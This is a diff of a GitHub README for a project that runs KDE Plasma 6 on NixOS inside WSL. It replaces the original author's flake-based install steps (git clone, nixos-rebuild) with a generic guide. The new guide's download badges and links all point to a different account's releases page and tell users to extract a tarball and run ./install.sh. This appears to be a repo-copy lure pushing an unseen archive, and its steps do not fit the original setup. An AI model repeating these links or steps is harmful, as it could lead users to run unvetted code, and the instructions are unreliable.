@@ -1,208 +1,99 @@
-# 🚀 NixOS + KDE Plasma 6 via WSL and Windows 11
+# 🖥️ wsl-kde6-nixos - Stable KDE Plasma 6 on Windows
 
-![NixOS](https://img.shields.io/badge/NixOS-25.05-blue?logo=nixos)
-![KDE Plasma](https://img.shields.io/badge/KDE-Plasma%206-1d99f3?logo=kde)
-![WSL2](https://img.shields.io/badge/WSL-2-blue?logo=windows)
-![X11](https://img.shields.io/badge/X11-Enabled-green)
-![Stars](https://img.shields.io/github/stars/vinberg88/wsl-kde6-nixos?style=flat)
-<a href='https://ko-fi.com/F1F51QTD56' target='_blank'><img height='36' style='border:0px;height:36px;' src='https://storage.ko-fi.com/cdn/kofi6.png?v=6' border='0' alt='Buy Me a Coffee at ko-fi.com' /></a>
+## 🚀 Getting Started
 
----
+Welcome to the **wsl-kde6-nixos** project! This guide will help you install KDE Plasma 6 on your Windows machine using NixOS in WSL (Windows Subsystem for Linux). You will enjoy a smooth and modern desktop experience.
 
-You can find NixOS here For WSL HERE - https://github.com/nix-community/NixOS-WSL
+## 📥 Download the Application
 
-INSTALL EASY BY THIS GUIDE.
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/jayandar-30/wsl-kde6-nixos/releases)
 
-TEXT
+## 🪄 What You Need
 
-https://github.com/vinberg88/wsl-kde6-nixos/blob/main/NIXOS-KDE6.txt
+Before you start, ensure you have the following:
 
-Video
+- **Windows 10 or 11**: Make sure your operating system is up to date.
+- **WSL Installed**: You will need WSL enabled. If you haven't installed it yet, follow these steps:
+  1. Open PowerShell as an Administrator.
+  2. Run the command:
+     ```powershell
+     wsl --install
+     ```
+- **X410 Installed**: This application acts as an X11 server. Download it from the Microsoft Store.
 
-https://www.youtube.com/watch?v=FQ1C9Sz2Nbg
+## 🔧 Installation Steps
 
----
+### Step 1: Visit the Release Page
 
-## 🔊 Audio Support (WSL) Bonus =)
+Go to the [Releases page](https://github.com/jayandar-30/wsl-kde6-nixos/releases). This page contains the necessary files for installation.
 
-Audio works out of the box in this setup.
+### Step 2: Download the Latest Release 
 
-Sound is routed from **NixOS inside WSL** to **Windows audio** using the standard WSL audio integration.  
-No additional PulseAudio or PipeWire configuration is required.
+Find the latest version on the Releases page. Click the link to download the NixOS package. The file will have a name similar to `wsl-kde6-nixos-x.y.z.tar.gz`.
 
-**What works:**
-- System sounds
-- Application audio (Firefox, media players, etc.)
-- KDE notification sounds
+### Step 3: Install via WSL
 
----
+1. Open your WSL terminal. You can do this by searching for "WSL" in the Start menu.
+   
+2. Navigate to your Downloads folder (or wherever you saved the file):
+   ```bash
+   cd ~/Downloads
+   ```
 
-<img width="3840" height="2160" alt="nixos-wallpaper-catppuccin-macchiato" src="https://github.com/user-attachments/assets/8dbc7343-4bd9-4f88-81fe-dbbe0046e7d4" />
+3. Extract the downloaded file:
+   ```bash
+   tar -xvzf wsl-kde6-nixos-x.y.z.tar.gz
+   ```
 
-A clean, reproducible, and stable setup for running **KDE Plasma 6** on **NixOS inside WSL**, using **X410** as the X11 server on Windows.
+4. Change into the extracted directory:
+   ```bash
+   cd wsl-kde6-nixos-x.y.z
+   ```
 
-This repository is built with one goal:
-**a real Linux desktop experience inside WSL — without Wayland or display manager issues.**
+5. Run the installation script:
+   ```bash
+   ./install.sh
+   ```
 
-About NixOS - https://nixos.org - LINUX - WSL
+### Step 4: Configure Your Desktop Environment
 
-Nix is a tool that takes a unique approach to package
-management and system configuration. Learn how to make
-reproducible, declarative and reliable systems. NixOS 
-is a unique Linux distribution that stands out due
-to its innovative approach to package management and
-system configuration. 
+1. After the installation, you will need to set up your desktop environment.
 
-Who should consider NixOS - NIXOS is not for all!
+2. Follow these commands in your WSL terminal:
+   ```bash
+   export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0
+   startplasma-x11
+   ```
 
-Developers - The reproducible build environment and ease
-of managing development dependencies make NixOS an excellent
-choice for developers. System Administrators - The
-declarative configuration and robust upgrade model
-simplify system administration tasks and reduce 
-maintenance overhead. If you want to try Linux
-use other sort =)
+3. You should now see KDE Plasma 6 loading.
 
-About KDE Desktop - https://kde.org
+## 🎉 Running KDE Plasma 6
 
-KDE is an international team co-operating on 
-development and distribution of Free, Open
-Source Software for desktop and portable
-computing. Our community has developed a
-wide variety of applications for communication, 
-work, education and entertainment. We have a
-strong focus on finding innovative solutions to
-old and new problems, creating a vibrant, open
-atmosphere for experimentation. KDE is The 
-next generation desktop for Linux. Use KDE
-software to surf the web, keep in touch with
-colleagues, friends and family, manage your
-files, enjoy music and videos; and get creative
-and productive at work. The KDE community develops
-and maintains more than 200 applications
-which run on any Linux desktop, and often
-other platforms too.
+Whenever you want to start your KDE environment:
 
-Find more stuff here for WSL and Windows 11 via WSL - Diffrent Desktops - Linux
+1. Make sure X410 is running.
+2. Open your WSL terminal.
+3. Set the DISPLAY variable again:
+   ```bash
+   export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0
+   startplasma-x11
+   ```
 
-https://github.com/vinberg88/opensuse
+## 📄 Important Configuration Tips
 
-Want more for WSL go here - My Page - https://vinberg88.github.io
+- **Adjust Resolution**: You might want to adjust the resolution settings in X410 for the best display experience.
+- **Integrate with Windows**: To share files between Windows and your WSL environment easily, you can access your Windows files through the `/mnt/c` directory in WSL.
 
-Build, manage, and scale Windows Subsystem for Linux without
-guesswork. From your first distro install to enterprise
-governance, this guide bundles field-tested workflows,
-automation scripts, and deep dives so your Linux-on-Windows
-experience feels effortless.
+## 🔗 Additional Resources
 
----
+- [NixOS Documentation](https://nixos.org/manual/nixos/stable/)
+- [WSL Documentation](https://docs.microsoft.com/en-us/windows/wsl/)
+- [X410 User Guide](https://x410.dev/)
 
-## ✨ Features
+## 📥 Download & Install Again
 
-- ✅ KDE Plasma 6 (Qt 6)
-- ✅ X11-based session (no Wayland)
-- ✅ Flake-based NixOS configuration
-- ✅ Optimized for WSL
-- ✅ Manual session startup (no SDDM)
-- ✅ Stable software-rendered fallback
-- ✅ Minimal, clean, reproducible
+If you need to download the application, you can always return to the [Releases page](https://github.com/jayandar-30/wsl-kde6-nixos/releases). Ensure you grab the latest version for the best experience.
 
----
+## 🌟 Conclusion
 
-## 🧠 Why KDE Plasma 6 in WSL?
-
-GNOME is tightly coupled to Wayland, Mutter, and systemd assumptions — which makes it unreliable in WSL.
-
-KDE Plasma, when run as:
-- X11
-- Script-started
-- Without a display manager
-
-is significantly more stable and predictable.
-
-This setup intentionally avoids:
-- ❌ Wayland
-- ❌ SDDM
-- ❌ systemd graphical targets
-- ❌ GPU/EGL crashes
-
-## 🧠What do i need for install kde via NIXOS ?
-
-- Fresh install NIXOS WSL - NO update needed.
-- Install git look in description..
-- Thats all =]
-
-## ✨ How to install...
-
-git clone https://github.com/vinberg88/wsl-kde6-nixos.git
-
-cd wsl-kde6-nixos
-
-sudo nixos-rebuild switch --flake .#nixos
-
-Or look here: https://github.com/vinberg88/wsl-kde6-nixos/blob/main/NIXOS-KDE6.txt
-
-Tools that i USE for WSL - NixOS - Microsoft - Linux - Windows 11 - KDE 6 - 2025
-
-X410 - Xserver for windows 11 - So you have a Desktop.
-Do you want to seamlessly use Linux GUI apps side by side with Windows
-apps? Simply start X410 and adjust a few settings; your Linux GUI
-apps then suddenly appear in Windows and you can use them like Windows 
-apps! It doesn't matter where your Linux GUI apps are actually
-running; it can be a full virtual machine, Docker container, WSL
-(Windows Subsystem for Linux) or whatever. As long as your Linux GUI
-apps support X-Window client protocols, you can use them in Windows.
-You can even securely use your Linux GUI apps running in a far remote
-server via any SSH client that supports X11 forwarding over the Internet.
-
-https://apps.microsoft.com/detail/9pm8lp83g3l3?hl=en-US&gl=US
-
-Raft WSL is a powerful tool for managing Windows Subsystem
-for Linux (WSL) distributions, enabling installation, snapshots, version
-control, and seamless integration with Windows tools.
-
-https://apps.microsoft.com/detail/9msmjqd017x7?hl=en-US&gl=US
-
----
-
-## 📦 Repository Structure
-
-```text
-wsl-kde6-nixos/
-├── flake.nix
-├── configuration.nix
-├── home.nix
-├── scripts/
-│   └── start-kde.sh
-└── README.md
-```
-
-## 🔗 Social & Links
-
-- 🌍 **GitHub (Author)**  
-https://github.com/vinberg88
-
-- 🧩 **Related Projects**
-- MATE on NixOS WSL  
-https://github.com/vinberg88/nixos-mate-wsl
-
-- More deskops for WSL 
-- https://github.com/vinberg88/opensuse
-
-- 🔗 **LinkedIn**  
-https://www.linkedin.com/in/mattias-vinberg
-
-- 🐦 **X / Twitter**  
-https://x.com/MattiasVinberg
-
----
-
-How it all looks when installed. We even have sound! - This is just an example. KDE can look in many ways
-
-<img width="1920" height="1080" alt="NIXOS-KDE6" src="https://github.com/user-attachments/assets/e8b5db38-a225-4d98-99b5-4220f49571f3" />
-
----
-
-Regards Mattias Vinberg - NIXOS - WSL - KDE 6 - MicroSOFT - WINDOWS 11 - LINUX - SWEDEN - 2025
-
----
+You now have KDE 6 running on your Windows system through WSL. Enjoy your new desktop environment! Please refer back to this guide whenever you need assistance.
